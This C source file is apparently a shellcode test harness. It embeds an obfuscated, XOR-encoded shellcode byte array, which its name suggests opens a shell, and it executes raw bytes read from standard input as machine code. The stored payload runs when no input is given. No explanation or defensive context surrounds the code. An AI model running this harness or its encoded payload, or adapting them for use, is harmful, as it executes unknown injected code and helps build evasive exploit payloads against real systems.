#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

unsigned char shells[] = "\xeb\x0d\x5e\x31\xc9\xf3\x0f\x6f\x0e\x66\x0f\xef\xdb\xeb\x15\xe8\xee\xff\xff\xff\x7d\x3c\x69\xde\xbb\xd6\x69\x66\x3d\xca\x3f\xc1\x1f\x0c\x1e\xdc\xeb\x2f\x5e\x89\xf2\xf3\x0f\x6f\x06\x66\x0f\xef\xc1\xf3\x0f\x7f\x06\xc4\xe2\x79\x17\xd8\x73\x02\xff\xe2\xf3\x0f\x6f\xd1\x66\x0f\x73\xf9\x07\x66\x0f\x73\xda\x09\x66\x0f\xeb\xca\x83\xc6\x10\xeb\xd4\xe8\xcc\xff\xff\xff\x4c\xfc\x39\xb6\xd5\xf9\x1a\x0e\x55\xe5\x10\xa3\x76\x85\xfd\x8c\x43\xdd\x92\x96\xed\xae\xd7\xb0\xbc\x69\xde\xbb\xd6\x69\x66\x3d\x69\xde\xbb\xd6\x69\x66\x3d\xca\x3f\xc1\x1f\x0c\x1e\xdc\x7d\x3c";

int main(){
	unsigned char shellcode[2048];// = (char *)malloc(2048);
	int payload_len = read(0, shellcode, 2048);
	if (payload_len <= 0){
		printf("Using stored shellcode\n");
		int (*ret)() = (int(*)())shells;
		ret();
	}
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
	printf("Returned from the shellcode\n");
}
